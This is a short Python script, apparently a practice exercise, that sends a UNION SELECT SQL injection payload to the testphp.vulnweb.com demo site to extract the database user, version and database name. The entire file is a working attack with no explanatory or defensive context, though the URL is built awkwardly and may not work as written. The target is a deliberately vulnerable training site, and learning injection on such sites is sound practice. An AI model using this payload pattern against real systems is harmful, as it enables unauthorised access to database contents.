import requests

target = "http://testphp.vulnweb.com/listproducts.php?c"
payload= "UNION SELECT 1,user(),3,4,5,6,version(),8,database(),10,11"
url = target + payload
r=requests.post(url)
if r.status_code == 200:
	print("DONE")
	print(r.text)
else:
	print( "Invalid URL")
